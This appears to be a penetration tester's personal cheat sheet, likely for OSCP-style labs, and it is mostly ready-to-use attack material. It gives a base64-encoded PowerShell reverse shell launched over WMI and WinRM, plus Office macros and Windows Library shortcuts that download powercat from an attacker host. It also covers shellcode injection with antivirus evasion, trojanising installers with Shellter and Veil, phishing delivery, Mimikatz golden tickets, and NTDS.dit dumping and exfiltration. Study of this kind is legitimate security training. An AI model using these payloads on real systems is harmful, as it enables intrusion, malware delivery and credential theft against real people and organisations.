# Links
- PayloadAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
- Box Writeups https://0xdf.gitlab.io/
- [PG & HTBV Boxes for OSCP Prep](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview?pli=1#)
- [Impacket usage & detection](https://neil-fox.github.io/Impacket-usage-&-detection/)

Fix zsh corrupt history
```
cd ~ ||
mv .zsh_history .zsh_history_bad ||
strings .zsh_history_bad > .zsh_history || 
fc -R .zsh_history ||
rm ~/.zsh_history_bad
```
- Python Virtual Environment https://www.freecodecamp.org/news/how-to-setup-virtual-environments-in-python/
- Building an .exe from .csproj & .sln files (.NET)
	- `git clone https://github.com/RepoToClone` then `cd RepoToClone`
## WMI
Abusing WMI in PowerShell (to launch Calc)
```
$username = 'targetuser'; #not the current user
$password = 'Password123!'; #not the current password
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.target.ip -Credential $credential -SessionOption $Options 
$command = 'calc';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
````
---
To generate a base64-encoded reverse shell, create the following python script (encode.py);
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.attacker.ipaddress",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
Setup a NetCat Listener: `nc -lnvp 443`
Then setup variables on the target with PowerShell & invoke process creation;
```
$username = 'targetuser';
$password = 'password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.target.ip -Credential $credential -SessionOption $Options

$Command = 'powershell -nop -w hidden -e BASE64_OUTPUT_FROM_EARLIER_SCRIPT_JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

Reverse Shell - WinRM
Generate base64 encoded reverse shell with python above, launch a NetCat lsitener, and then in PowerShell run;
```
winrs -r:files04 -u:targetuser -p:Password123!  "powershell -nop -w hidden -e BASE64_OUTPUT_FROM_EARLIER_SCRIPT_JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

It's also possible to invoke New-PSSession in PowerShell 
```
$username = 'targetuser';
$password = 'Password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.target.ip -Credential $credential
```
And enter the newly created session with: `Enter-PSSession 1`

# Metasploit Framework
- Setup a msf database: `sudo msfdb init`
	- To start on bootup: `sudo systemctl enable postgresql`
- Launch Metasploit: `sudo msfconsole` (add `-q` to launch without banner)
- Check database connectivity: `db_status`
- All available commands: `help`
- Workspaces
	- Check workspaces; `workspace`
	- Create workspace: `workspace -a workspacename`
- Run nmap inside metasploit: `db_nmap` (eg. `db_nmap -A 192.168.154.10 -v`)
- List discovered hosts: `hosts`
- List discovered services: `services` (add `-p 8000` to list services on port 8000)
- Show auxiliary modules: `show auxiliary`
- Search for SMB auxiliary modules: `search type:auxiliary smb`
	- To use a module (eg. #56) found in a search: `use 56`
	- To get info on a module you've selected to use: `info`
	- To see options for a module: `show options`
	- To set options (eg. "RHOSTS" to 192.168.50.145): `set RHOSTS 192.168.50.147` 
		- And unset with: `unset RHOSTS`
	- Set "rhosts" to all discovered hosts with open port 445: `services -p 445 --rhosts`
	- To execute a module: `run`
	- To execute a module in the background: `run -j` (use `jobs` to list running jobs)
- To display vulnerabilities found by the module: `vulns`
## Exploit Modules
To lookup exploit info;
- Select the module with `use` and the module number (eg. `use 10`)
- Then type `info`
To set a payload: `set payload payloadnameornumber` 
	eg. `set payload payload/linux/x64/shell_reverse_tcp`
	eg. List payloads with `show payloads` then `set payload 15`
	Staged payloads denoted by `/`

To push a session to background: `Ctrl+Z` and `Y`
To list sessions: `sessions -l`
To interact with a session: `sessions -i id#` eg. `sessions -i 2`
To kill a session: `sessions -k #id`
To kill all sessions: `session -K`
To list 
### Meterpreter
- Run `help` for details
- To create a shell inside meterpreter: `shell` (This also creates a channel)
- Channels can be switched between with `channels` and the same commands as `sessions`
- Adding `l` as a prefix forces the command locally (eg. `lpwd` is `pwd` on the local Kali VM)

# Client-side Attacks
## Information Gathering
Metadata on files: `exiftool -a -u brochure.pdf`
- -a for duplicated tags, -u for unknown tags
Use theHarvester to extract an email address from a target
Use canarytokens.org/generate to create tokens if a target link is accessed

## RCE with Office Macros
- Save .doc file (not .docx) with easy to ID name (eg. mymacro.doc)
me Macro (eg. MyMacro), select .doc name from "Macros in:" then Create
- Add VBA Code
```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()
	Dim Str As String
	PLACE-BASE64-ENCODED-ATTACK-STRING-HERE--MAX-LINE-LENGTH-50-CHAR
	--CONCAT-LINE-STRINGS-WITH-PYTHON-TO-AVOID-CHAR-LIMIT
  CreateObject("Wscript.Shell").Run Str
  
End Sub
````````

- Take Powershell one-line reverse-shell; ````
IEX(New-Object System.Net.WebClient).DownloadString('http://attackerip.serving.powercat/powercat.ps1');powercat -c attackerip.for.reverse.shell -p 4444 -e powershell
- Use https://www.base64encode.org/ to convert to base64 string with UTF-16LE
- Break base64 string into 50 chars with python (use mousepad to create script.py)
````
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
````
- Run script to produce something like;
````
Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "
````
- And drop it into the Macro's VBA to complete the Macro.
- Run netcat listener for a reverse shell when document is opened `nc -nvlp 444`

## RCE with Windows Library Files
- Create a directory for webdav sharing: `mkdir /home/user/webdav
- Start wsgidav server in that folder: `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/user/webdav` (Confirm by adding test.txt to the folder and visiting 127.0.0.1)
- Visual Code Editor: Save a text file "config.Library-ms" in `webdav` with the following;
``````
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://ipaddress.serving.webdav.folder</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
``````
- Create a Windows shortcut with the following path; 
``````
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://attackerip.serving.powercat:8000/powercat.ps1');
powercat -c attackerip.for.reverse.shell -p 4444 -e powershell"
``````
## Delivering Macros & Windows Library Files
With `nc` running on 4444, and from shared `webdav` folder served on port 8000:
- If SMB (port 139) is open: `smbclient //target.ip.address.here/share -c 'put config.Library-ms'`
- If SMPT (port 25 or 587) is open: `sudo swaks -t known.user@target.com --from test@target.com -ap --attach @config.Library-ms --server target.mail.server.ip --body @emailbody.txt --header "Subject: " --suppress-data --auth-user test@target.com --auth-password knownpassword` (IMPORTANT: Put @ in front of filenames)

# Password Rules
- Create `password.rule` file, eg.
```
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
	- Rules are applied by line from left to right in the `demo.rule` file
		- `$1 c` will capitalise the first letter AND adds `1` to the end (eg. `Password1`)
		- `$1` adds 1 to the end (eg. `password1`)
		  `c` Capitalises the same password (eg. `Password`)
	- Examples
		- `$1 c $!` mutates `password` into `Password1!`
		- `$! c $1` mutates `password` into `Password!1`
		- `$1 $2 $3 c $!` mutates `password` into `Password123!`
- Append `password.rule` to JtR's `.config` file: `sudo sh -c 'cat /home/user/Downloads/password.rule >> /etc/john/john.conf'`

| **Name**          | **Function** | **Description**                                | **Example Rule** | Output from `p@ssW0rd` |
| ----------------- | ------------ | ---------------------------------------------- | ---------------- | ---------------------- |
| Nothing           | :            | Do nothing                                     | :                | p@ssW0rd               |
| Lowercase         | l            | Lowercase all letters                          | l                | p@ssw0rd               |
| Uppercase         | u            | Uppercase all letters                          | u                | P@SSW0RD               |
| Capitalize        | c            | Capitalize the first letter and lower the rest | c                | P@ssw0rd               |
| Append Character  | $X           | Append character X to end                      | $1               | p@ssW0rd1              |
| Prepend Character | `^X`         | Prepend character X to front                   | `^1`             | 1p@ssW0rd              |
| Replace           | sXY          | Replace all instances of X with Y              | ss$              | p@$$W0rd               |
| Duplicate         | d            | Duplicate password                             | d                | p@ssW0rdp@ssW0rd       |
# Evading Antivirus
Thread Injection on Windows
- Use template below
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
- Note: Consider modifying template to change all static variable names to be more generic;
	- eg. `winFunc` to `var2`, `Win32` to `Win32`, `$sc` to `var1`
- Generate reverse shellcode with msfvenom: `msfvenom -p windows/shell_reverse_tcp LHOST=local.ip.address.here LPORT=localportnumber -f powershell -v sc`
- Drop output into placeholder `<place your shellcode here>` 
- Run Powershell script on target computer to create reverse shell: `.\payload.ps1`

## Automatic Injection with `Shellter`
- Download a target file (eg. SpotifySetup.exe)
- Run `sudo shellter` in Auto Mode (`A`)
	- Define target file location
	- Allow tracing to run for 60 seconds
	- Enter Stealth Mode (`y`)
	- Use a listed payload (`L`) and Select payload by index (eg. `1` for Meterpreter_Reverse_TCP)
	- Set LHOST & LPORT, then allow Shellter to complete process
- Run a Meterpreter Listener to pickup the shell: `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.xx.xx;set LPORT 4444;run;"`
- Copy the file from Kali to Target machine: `certutil.exe -urlcache -split -f "[http://<your ip here>:80/](http://10.10.0.61:90/nc.exe)winrar-x32-611.exe"`

## Automatic AV-evading Payloads with `Veil`
- Run Veil: `veil` 
	- Install: `sudo apt -y install veil` 
	- Be aware this requires wine, is +800mb in size, & takes a long time to install/setup
	- More info: https://github.com/Veil-Framework/Veil
	- Full veil/evasion tutorial https://www.youtube.com/watch?v=iz1twCSJZyo
- Select evasion: `use 1`
- List available payloads: `list`
- Select payload: `use 22` (eg. For Powershell Meterpreter Reverse TCP)
	- Note: The lover-level the language, the greater chance of success
- Set LHOST & LPORT: `Set LHOST 192.168.xx.xx` & `set LPORT 4444`
- Generate payload: `generate`
- Enter name for payload (eg. `payload` or `testbatfile`)
- Create meterpreter listener: `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.xx.xx;set LPORT 4444;run;"`
- Copy `payload.bat` from `/var/lib/veil/output/source/` onto target 
- Execute file on target, check connection from target
	- Run `shell` in meterpreter once connection is made
## **Automatic Code Execution**
Use `sqlmap` for automated SQLi - very noisy, zero stealth approach
- Dump the entire database: `sqlmap -u http://taregt.ip.address.here/blindsqli.php?user=1 -p user --dump`
- Establish full interactive shell: `sqlmap -u http://taregt.ip.address.here/blindsqli.php?user=1 -p user --os-shell`

`sqlmap` can also grab POST requests from Burpsuite
- Intercept POST request in Burp, save to local text file `post.txt`
- Establish shell in web root: `sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"`

# Port Redirection & SSH Tunnelling
Once connected to an internet-facing server, run `ip addr` & `ip route` to find other connections
To view Confluence configuration file: `cat /var/atlassian/application-data/confluence/confluence.cfg.xml`
## Port Forwarding with Socat
Socat runs on the intermediary system (eg. jump server between Kali & Target)
Example: `socat -ddd TCP-LISTEN:2345,fork TCP:10.4.182.215:5432`
- Provide verbose output: `-ddd`
- Listens on 2345: `TCP-LISTEN:2345`
- New connection forks a new TCP sub-process: `fork TCP:TCP:10.4.50.215:5432`

To change connection type, kill the Socat process: 
- Find process number: `ps aux | grep socat`
- Kill the process: `kill -9 process#` eg. `kill -9 3540`

# AD Persistence
## Golden Ticket
Access DC & target `krgtgt` NTLM Hash (Mimikatz): `privilege::debug` & `lsadump::lsa /patch`
Move to different machine and;
- Purge tickets(Mimikatz): `kerberos::purge`
- Create Golden Ticket for a specific user(Mimikatz): `kerberos::golden /user:targetuser /domain:corp.com /sid:S-1-5-21-DOMAINSID-658905905-1781884369 /krbtgt:NTLMHASHOFKRBTGT7af11ef34d1c788f47 /ptt`
- Launch a new cmd prompt(Mimikatz): `misc::cmd`
- Use PsExec to run cmd on DC1: `\SysinternalsSuite\PsExec.exe \\dc1 cmd.exe`
	- IMPORTANT: Use the *hostname* for this, **not** the IP Address (Access Blocked)

## Shadow Copies
VSS - Volume Shadow Service
- Using domain admin on DC to extract NTDS.dit database file(Tools): `vshadow.exe -nw -p C:`
- Copy backup to "C:" : `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
- Save the SYSTEM hive from the Windows registry: `reg.exe save hklm\system c:\system.bak`
- Exfiltrate both files to Kali: `sudo impacket-smbserver share -smb2support /home/ -user validuser -password 'Password123!'`
- Use Impacket to dump secrets: `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`